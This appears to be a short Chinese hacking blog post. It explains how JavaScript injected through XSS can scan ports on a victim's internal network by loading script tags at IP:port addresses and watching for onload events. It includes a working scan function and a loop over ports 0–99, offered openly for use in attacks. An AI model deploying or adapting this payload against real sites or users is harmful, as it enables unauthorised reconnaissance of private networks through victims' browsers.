---
category:	hacking
layout:		post
title:		xss中使用js扫描外|内网端口
desc:		在xss攻击中，为了更深一步探测信息，可以尝试着获取一下内网IP段，然后进行端口扫描。当然，神马中间人攻击、跳板exp的这里就不说了。
tags:		[xss,javascript扫描端口,xss扫描端口]
---
#### 原理
因为能允许跨域访问的URL实在太少，所以使用`Ajax`技术来实现貌似不太可能，还好，有了一个比较好的思路。    
因为例如`img`,`script`等标签都可以进行跨域访问外部资源，所以这就给了我们想象空间。如果我们创建一个`script`，然后地址为内网的ip+端口，如果加载成功（就算代码执行出错）也会触发`onload`事件，这时候我们所要达到的目的已经完成了。

#### 实现
先简单贴一些代码：
[code:javascript:edoc]
function scan(ip, port){
	var s = document.createElement("script");
	s.src = "http://" + ip + ":" + port;
	s.onload = function(){
		console.log("[*] IP:%s PORT:%s OPEN!", ip, port);
	}
	document.body.appendChild(s);
}
[codend]
然后我们使用`for`循环扫描端口，例如：
[code:javascript:edoc]
for (var i = 0; i < 100; i++) {
	scan("10.1.1.1", i);
};
[codend]
这时候如果对方端口打开，就会触发`onload`事件了，事件里的功能代码可以随意扩展～